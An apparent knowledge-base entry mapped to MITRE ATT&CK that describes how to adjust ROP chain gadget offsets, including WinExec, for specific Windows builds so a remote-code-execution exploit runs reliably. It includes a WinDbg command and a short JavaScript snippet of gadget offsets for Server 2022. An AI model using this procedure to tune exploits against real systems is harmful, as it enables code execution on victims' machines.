---
tags:
  - rop
  - debugging
  - windows
type: procedure
tools:
  - '[[tools/Windbg]]'
  - '[[tools/AWS-EC2]]'
  - '[[tools/VirtualBox]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/adjust-rop-gadget-server2022]]'
verified: false
platforms:
  - Windows
submitted: true
techniques:
  - '[[Exploitation for Client Execution]]'
sub_techniques: []
id: 2169ad5a-0658-4e4f-a3be-98125329f54b
created_at: '2025-12-13T23:55:06.762Z'
updated_at: '2025-12-13T23:55:06.762Z'
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
---
# Adjust-ROP-Chain-for-Target-OS

## Summary

This procedure adjusts ROP chain offsets for specific Windows builds (e.g., 11 23H2, Server 2022) using debugging tools to ensure reliable RCE.

## Description

ROP gadgets and offsets like kernel32!WinExec vary by OS build. Use Windbg on a VM to locate and update them, verifying the chain works across targets.

## Requirements

1. Target OS VM (Windows 11/Server 2022)
2. Windbg installed
3. Prior ROP chain template

## Defense

- ASLR and DEP to randomize offsets
- Monitor debugger attachments
- Patch V8/Electron vulnerabilities

## Objectives

1. Locate OS-specific offsets
2. Update ROP gadgets
3. Test on target build

## Instructions

### Step 1: Setup VM and Debug

**Context**: Launch VM with Windbg attached.

**Command** (Manual):
```bash
# Use Windbg: windbg -k com:pipe=debugpipe,mode=attach
```

### Step 2: Find and Adjust Offsets

**Context**: Query symbols for WinExec offset.

**Command** ([[commands/adjust-rop-gadget-server2022]]):
```js
add_gadget(0x30bb9c0) // mov rax,qword ptr [rcx]; ret;
add_gadget(0x4536e4d+2) // pop rbx; ret;
set_reg(idx++, 0x68820-423328)
set_reg(idx++,0 )
```

> Adjusts for Server 2022; expected: Updated chain executes without crashes.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploitation for Client Execution]]

### Sub-Techniques


## Commands Used

- [[commands/adjust-rop-gadget-server2022]]

## Tools Used

- [[tools/Windbg]]

## Tags

- [[rop]]
